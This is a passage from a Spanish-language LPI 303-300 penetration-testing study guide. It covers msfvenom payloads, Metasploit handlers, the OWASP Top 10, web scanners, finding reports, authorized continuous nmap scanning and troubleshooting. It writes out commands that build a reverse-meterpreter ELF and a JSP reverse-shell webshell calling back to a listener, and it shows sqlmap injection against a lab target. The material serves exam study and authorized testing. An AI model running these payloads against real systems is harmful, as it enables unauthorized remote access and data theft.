[+] Unshadowed Password File: /root/.msf4/loot/..._linux.hashes_734921.txt
```

### 6.6 `msfvenom` — generación de payloads standalone

`msfvenom` (la fusión de `msfpayload` + `msfencode`) construye payloads fuera de un exploit — para documentos de phishing, webshells subidos o entrega manual.

```bash
# Linux ELF reverse-meterpreter, staged
└─# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.30.0.10 LPORT=4444 \
             -f elf -o /tmp/payload.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: /tmp/payload.elf

# A JSP webshell for a vulnerable file-upload (Java app servers)
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.30.0.10 LPORT=4444 -f raw -o shell.jsp
```

Luego capturás cualquier payload reverse con el handler genérico:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.30.0.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 172.30.0.10:4444
```

> **Los encoders no son bypass de AV.** `-e x86/shikata_ga_nai` re-codifica un payload para compatibilidad a nivel de byte (evitando bad chars como null bytes), *no* para evadir EDR modernos — el AV basado en firmas atrapa el decoder stub. La evasión real es la clase de módulos `evasion` y está fuertemente gateada por RoE. El examen espera que conozcas el propósito *real* de un encoder.

---

## 7. Testing de aplicaciones web — OWASP Top 10 y scanners

El objetivo requiere *conocimiento* del OWASP Top 10 y del escaneo de aplicaciones web — no explotación exhaustiva, pero debés reconocer las categorías de riesgo y las herramientas nombradas.

### 7.1 OWASP Top 10 (2021)

| ID | Categoría | Problema representativo | Detección rápida |
|---|---|---|---|
| A01 | Broken Access Control | IDOR, missing authz, path traversal | Testing de authz con Burp/ZAP |
| A02 | Cryptographic Failures | Transporte en plaintext, TLS débil, mala gestión de claves | `nmap --script ssl-enum-ciphers`, `testssl.sh` |
| A03 | Injection | SQLi, command injection, LDAPi | `sqlmap`, active scan de ZAP |
| A04 | Insecure Design | Falta de threat model, workflow defectuoso | Revisión manual |
| A05 | Security Misconfiguration | Credenciales por defecto, errores verbosos, admin abierto | Nikto, `nuclei` |
| A06 | Vulnerable & Outdated Components | Libs/frameworks sin parchear | `nmap -sV`, `nuclei`, dependency scan |
| A07 | Identification & Auth Failures | Contraseñas débiles, sin MFA, session fixation | `hydra`, análisis de sesión |
| A08 | Software & Data Integrity Failures | Deserialización insegura, updates sin firmar | Manual, `nuclei` |
| A09 | Logging & Monitoring Failures | Sin audit trail, sin alertas | Revisión de detección (blue-team) |
| A10 | Server-Side Request Forgery (SSRF) | El servidor busca la URL del atacante | Manual, out-of-band (OAST) |

### 7.2 Los scanners web nombrados

```bash
# Nikto — fast, noisy web server misconfiguration/known-file scanner (A05/A06)
└─# nikto -h http://172.30.0.30
- Nikto v2.5.0
+ Target IP:          172.30.0.30
+ Server: Apache/2.4.25 (Debian)
+ /: The X-Content-Type-Options header is not set.
+ /config/: Directory indexing found.
+ /login.php: Admin login page/section found.
+ Apache/2.4.25 appears to be outdated (current is at least 2.4.54).
+ OSVDB-3268: /docs/: Directory indexing found.
+ 7521 requests: 0 error(s) and 8 item(s) reported

# gobuster — content/endpoint discovery (feeds A01 access-control testing)
└─# gobuster dir -u http://172.30.0.40 -w /usr/share/wordlists/dirb/common.txt -q
/assets    (Status: 301) [Size: 179] [--> /assets/]
/ftp       (Status: 200) [Size: 11651]
/robots.txt (Status: 200) [Size: 28]
/rest      (Status: 500) [Size: 84]

# sqlmap — automated SQL injection (A03). --batch = non-interactive defaults.
└─# sqlmap -u "http://172.30.0.30/vulnerabilities/sqli/?id=1&Submit=Submit" \
           --cookie="PHPSESSID=abc; security=low" --batch --dbs
[*] starting @ 22:58:03
[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable
[INFO] the back-end DBMS is MySQL
available databases [2]:
[*] dvwa
[*] information_schema
```

**OWASP ZAP** y **Burp Suite** son los dos proxies interceptores nombrados — configurás el navegador para enrutar a través del proxy, luego mapeás pasivamente la app y corrés active scans contra A01–A10. **`nuclei`** es el scanner moderno basado en plantillas ampliamente usado para A05/A06 a escala. Sabé nombrar estos y decir qué hace cada uno.

---

## 8. Reporting y el ciclo de vida del hallazgo

Todo lo que capturaste (XML de `-oA`, loot de msf, screenshots) existe para producir el entregable. Un hallazgo es creíble solo si es **reproducible y con riesgo puntuado**. Anclá la severidad a CVSS, no a adjetivos.

```yaml
# finding-0007.yaml — one entry in the technical findings deliverable
finding:
  id: F-0007
  title: "Unauthenticated RCE via Samba username map script (CVE-2007-2447)"
  attck: ["T1210 Exploitation of Remote Services"]
  severity:
    cvss_v3_1: 10.0
    vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
  affected: ["172.30.0.20:139"]
  evidence:
    scan: "scans/meta2_full.xml"
    exploit_module: "exploit/multi/samba/usermap_script"
    proof: "meterpreter getuid => root; hashdump captured"
  reproduction:
    - "nmap -p139 --script smb-os-discovery 172.30.0.20  # confirm Samba 3.0.20"
    - "msf: use exploit/multi/samba/usermap_script; set RHOSTS 172.30.0.20; exploit"
  business_impact: "Full root on host adjacent to cardholder segment; enables lateral pivot."
  remediation:
    - "Upgrade Samba to a supported release (>= current stable)."
    - "Remove the non-default 'username map script' smb.conf directive."
    - "Enforce egress filtering to block reverse-shell call-backs (see 334.3)."
  retest_status: open
```

---

## 9. Validación continua de la superficie de ataque en producción (infraestructura)

Un pentest una vez al año no puede seguirle el ritmo a una plataforma que despliega a diario. El patrón SRE/Platform es correr la porción *segura, no explotativa* de la disciplina — escaneo autorizado — **de forma continua**, y hacer diff del resultado contra la intención declarada. Abajo, un `CronJob` de Kubernetes realiza un escaneo `nmap` nocturno de un rango autorizado dentro del alcance y escribe artefactos a un `PVC`; un gate de pipeline compañero falla un merge si aparece un nuevo puerto que no está en la allow-list aprobada.

```yaml
# attack-surface-scan.yaml — scheduled, authorized, safe-category-only monitoring
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: scan-artifacts
  namespace: security-scanning
spec:
  accessModes: ["ReadWriteOnce"]
  resources:
    requests:
      storage: 5Gi
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: scan-scope
  namespace: security-scanning
data:
  # Mirror of roe.yaml scope — the ONLY targets this job may touch.
  targets.txt: |
    203.0.113.0/28
    198.51.100.16/28
  # Declared, approved externally-reachable services. Anything else = drift alert.
  allowed-ports.txt: |
    203.0.113.10:443
    203.0.113.11:443
    198.51.100.20:22
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: attack-surface-scan
  namespace: security-scanning
spec:
  schedule: "0 3 * * *"            # 03:00 daily, inside the RoE window
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 7
  failedJobsHistoryLimit: 3
  jobTemplate:
    spec:
      backoffLimit: 1
      activeDeadlineSeconds: 3600
      template:
        spec:
          restartPolicy: Never
          securityContext:
            runAsNonRoot: false      # -sS needs raw sockets; scoped via capabilities
          containers:
            - name: nmap
              image: instrumentisto/nmap:7.94
              securityContext:
                allowPrivilegeEscalation: false
                capabilities:
                  drop: ["ALL"]
                  add: ["NET_RAW", "NET_ADMIN"]   # least privilege for scanning
              command: ["/bin/sh", "-c"]
              args:
                - |
                  set -euo pipefail
                  TS=$(date +%Y%m%dT%H%M%SZ)
                  OUT="/artifacts/${TS}"
                  mkdir -p "$OUT"
                  # SAFE categories only — never 'vuln'/'exploit'/'intrusive' unattended.
                  nmap -sS -sV --script "default,safe" \
                       --max-rate 500 -T2 \
                       -iL /scope/targets.txt \
                       -oA "${OUT}/surface"
                  # Emit machine-readable open-port list for the drift gate.
                  awk '/open/ && /\/tcp/ {gsub("/tcp","",$1); print h":"$1}' \
                      h="" "${OUT}/surface.gnmap" > "${OUT}/open-ports.txt" || true
                  echo "scan complete: ${OUT}"
              volumeMounts:
                - { name: artifacts, mountPath: /artifacts }
                - { name: scope,     mountPath: /scope, readOnly: true }
          volumes:
            - name: artifacts
              persistentVolumeClaim: { claimName: scan-artifacts }
            - name: scope
              configMap: { name: scan-scope }
```

El gate de CI correspondiente — un nuevo puerto alcanzable externamente que no está en `allowed-ports.txt` falla el build, convirtiendo el "drift de superficie" en una regresión atrapada en lugar de un hallazgo del año que viene:

```yaml
# .gitlab-ci.yml (excerpt) — surface-drift gate
attack-surface-gate:
  stage: verify
  image: instrumentisto/nmap:7.94
  rules:
    - if: '$CI_PIPELINE_SOURCE == "schedule"'   # authorized, scheduled context only
  script:
    - |
      nmap -sS -sV --top-ports 200 --max-rate 500 -T2 \
           -iL scope/targets.txt -oG - \
        | awk '/Ports:/{for(i=1;i<=NF;i++) if($i ~ /open/) print}' \
        | sort > actual-open.txt
    - |
      # Fail if any observed open port is NOT in the approved allow-list.
      if comm -23 actual-open.txt <(sort scope/allowed-ports.txt) | grep -q .; then
        echo "❌ Attack-surface drift detected — undeclared open port(s):"
        comm -23 actual-open.txt <(sort scope/allowed-ports.txt)
        exit 1
      fi
      echo "✅ Observed surface matches declared allow-list."
```

Esto es la frase del objetivo — "verify the effectiveness of network security measures" — operacionalizada: el estado previsto de `NetworkPolicy`/firewall se expresa como `allowed-ports.txt`, y `nmap` prueba continuamente si la realidad lo coincide.

---

## 10. El panorama más amplio de herramientas (conocimiento)

La lista de "common penetration testing tools" del objetivo. Reconocé la fase y función de cada herramienta.

| Fase | Herramienta | Función |
|---|---|---|
| Recon (pasivo) | `theHarvester`, `amass`, `recon-ng`, `whois`, `dnsrecon` | OSINT, descubrimiento de subdominios/emails/activos |
| Scanning | `nmap`, `masscan`, `unicornscan` | Descubrimiento de puertos/servicios |
| Vuln assessment | OpenVAS/Greenbone, Nessus, `nuclei`, Nikto | Detección de vulnerabilidades conocidas |
| Web | Burp Suite, OWASP ZAP, `sqlmap`, `gobuster`/`ffuf`, `wfuzz`, `whatweb` | Testing de la capa de aplicación |
| Exploitation | Metasploit, `searchsploit`/Exploit-DB, `msfvenom` | Explotación de vulnerabilidades y payloads |
| Password | `hydra`, `medusa`, `john`, `hashcat` | Ataques de credenciales online/offline |
| Wireless | suite `aircrack-ng` | Testing 802.11 |
| Sniffing/MITM | Wireshark, `tcpdump`, `ettercap`, `bettercap`, `responder` | Captura de tráfico, spoofing |
| Post-exploitation/C2 | Meterpreter, `mimikatz`, Empire, Cobalt Strike, Sliver | Persistencia, movimiento lateral, C2 |

```bash
# searchsploit — offline Exploit-DB search; the low-tech complement to msf's `search`
└─# searchsploit vsftpd 2.3.4
--------------------------------------------------- ----------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ----------------------------
vsftpd 2.3.4 - Backdoor Command Execution          | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Meta..) | unix/remote/17491.rb
--------------------------------------------------- ----------------------------
```

---

## 11. Verificación y diagnóstico de fallos

La diferencia entre un junior que corre scanners y un ingeniero es la capacidad de explicar *por qué un resultado es lo que es* y de distinguir un control real de un artefacto de tu propio tooling.

### 11.1 "El escaneo dice que el host está caído, pero sé que está arriba"

Un firewall descartó las probes de discovery ICMP/SYN, así que `nmap` saltó el port scan por completo.

```bash
# Symptom
└─# nmap 203.0.113.10
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds

# Fix: skip discovery, scan anyway
└─# nmap -Pn 203.0.113.10
# Or discover with a probe the firewall permits (e.g. SYN to a likely-open port)
└─# nmap -PS443,80,22 203.0.113.10
```

### 11.2 "Todo es `filtered`" vs. "todo es `closed`"

- **Todo `filtered`** → un firewall stateful está descartando tus probes (control funcionando) **o** tu tasa es demasiado alta y se están perdiendo paquetes (artefacto de tooling). Distinguí con `--reason` y bajando a `-T2 --max-rate 100`.
- **Todo `closed`** → el host es alcanzable y está arriba, pero **no hay packet filter** delante (vuelven RSTs). Eso es en sí mismo un hallazgo.

```bash
# --reason exposes the evidence behind each state decision
└─# nmap -sS -p22,80,443 --reason 203.0.113.10
PORT    STATE    SERVICE  REASON
22/tcp  filtered ssh      no-response          <- firewall dropping (or lost packet)
80/tcp  closed   http     reset ttl 64         <- host replied RST: reachable, no filter
443/tcp open     https    syn-ack ttl 64       <- listening
```

### 11.3 SYN scan degradado silenciosamente a connect scan

Correr `-sS` sin privilegio de raw-socket hace que `nmap` vuelva a `-sT`, que es más lento y *logueado por las aplicaciones del objetivo*.

```bash
$ nmap -sS 172.30.0.20        # as non-root
You requested a scan type which requires root privileges.
QUITTING!

# Correct: grant only the capability needed, not full root
$ sudo setcap cap_net_raw,cap_net_admin+eip $(which nmap)
```

### 11.4 El UDP scan reporta mayormente `open|filtered`

Esperado. Los puertos UDP cerrados responden con ICMP port-unreachable, pero los hosts **rate-limitan** ICMP (default de Linux ~1/seg), así que la mayoría de los puertos nunca reciben una respuesta definitiva y caen en `open|filtered`. Confirmá los pocos que importan con version probes y paciencia.

```bash
└─# nmap -sU -sV --version-intensity 0 -p53,123,161 172.30.0.20
PORT    STATE         SERVICE VERSION
53/udp  open          domain  ISC BIND 9.4.2
123/udp open|filtered ntp
161/udp open          snmp    SNMPv1 (public)     <- version probe forced a reply
```

Diagnosticá la realidad a nivel de paquete con `--packet-trace` cuando un estado sea inexplicable:

```bash
└─# nmap -sU -p161 --packet-trace 172.30.0.20
SENT (0.02s) UDP 172.30.0.10:37645 > 172.30.0.20:161 ...
RCVD (0.03s) UDP 172.30.0.20:161 > 172.30.0.10:37645 ...   <- reply => open
```

### 11.5 El reverse shell de Metasploit nunca se conecta de vuelta

El fallo más común de la fase de explotación, en orden de probabilidad:

1. **`LHOST` incorrecto.** En setups con NAT/contenedores el objetivo debe alcanzar tu IP *enrutable*, no `127.0.0.1` ni una dirección privada que no puede enrutar. Verificá con `ip addr` y un test de listener (`ncat -lvnp 4444` en vos, `ncat <LHOST> 4444` desde el objetivo).
2. **El firewall de egress bloquea `LPORT`.** Cambiá `LPORT` a 443/53 (comúnmente permitidos hacia afuera), o usá un payload `bind_tcp` si el egress está totalmente cerrado.
3. **Handler no corriendo / mismatch de stage.** Para payloads staged el handler debe estar arriba *antes* de que dispare el exploit, y el `set PAYLOAD` en el handler debe coincidir exactamente con el payload que entregó el exploit. `windows/meterpreter/reverse_tcp` (staged) y `windows/meterpreter_reverse_tcp` (stageless) **no** son intercambiables.
4. **Mismatch de arquitectura.** Un payload `x86` sobre un objetivo `x64` (o viceversa) puede crashear el stager. Hacé coincidir la arquitectura de `-sV`/`sysinfo`.
5. **DB no conectada.** `db_nmap`/`hosts`/loot hacen silenciosamente no-op sin PostgreSQL.

```bash
msf6 > db_status
[*] postgresql selected, no connection      # <- broken
# Fix:
└─# msfdb reinit && systemctl start postgresql
msf6 > db_connect -y /usr/share/metasploit-framework/config/database.yml
```

### 11.6 El script NSE no hace nada / da error

```bash
# Update the local script database after adding scripts
└─# nmap --script-updatedb
# Debug a script with --script-trace to see what it actually sent
└─# nmap -p445 --script smb-enum-shares --script-trace 172.30.0.20
```

### 11.7 Correlacioná tu actividad con el blue team

Un pentest también es un test en vivo de la detección. Antes de concluir que un control es bypasseable, confirmá si tu escaneo fue *visto*. Del lado defensivo, el mismo evento debería encender el IDS del 334.2 — un sweep `-sS` dispara firmas de port-scan de Suricata/Snort. Si tu ruidoso `-T4 -p-` no produjo **ninguna** alerta del SOC, ese silencio es en sí mismo un hallazgo de alta severidad (A09: Logging & Monitoring Failures) que vale tanto como cualquier puerto abierto.

---

## 12. References

- LPI — Exam 303-300 Objectives (Topic 335.2, Penetration Testing): https://www.lpi.org/our-certifications/exam-303-objectives/
- Nmap Reference Guide (scan types, port states, timing): https://nmap.org/book/man.html
- Nmap — Port Scanning Techniques: https://nmap.org/book/man-port-scanning-techniques.html
- Nmap Scripting Engine (NSE) documentation: https://nmap.org/book/nse.html
- Ncat User's Guide: https://nmap.org/ncat/guide/
- Masscan documentation: https://github.com/robertdavidgraham/masscan
- Metasploit Framework documentation: https://docs.metasploit.com/
- Metasploit Unleashed (Offensive Security): https://www.offsec.com/metasploit-unleashed/
- msfvenom documentation: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- OWASP Top 10 (2021): https://owasp.org/www-project-top-ten/
- OWASP Web Security Testing Guide (WSTG): https://owasp.org/www-project-web-security-testing-guide/
- OWASP ZAP: https://www.zaproxy.org/docs/
- Penetration Testing Execution Standard (PTES): http://www.pentest-standard.org/
- NIST SP 800-115 — Technical Guide to Information Security Testing and Assessment: https://csrc.nist.gov/pubs/sp/800/115/final
- OSSTMM (ISECOM): https://www.isecom.org/OSSTMM.3.pdf
- MITRE ATT&CK: https://attack.mitre.org/
- Nikto: https://github.com/sullo/nikto
- sqlmap: https://sqlmap.org/
- Nuclei (ProjectDiscovery): https://docs.projectdiscovery.io/tools/nuclei/overview
- CVE-2007-2447 (Samba username map script): https://nvd.nist.gov/vuln/detail/CVE-2007-2447
- CVE-2017-7494 (SambaCry): https://www.samba.org/samba/security/CVE-2017-7494.html
- FIRST — CVSS v3.1 Specification: https://www.first.org/cvss/v3-1/specification-document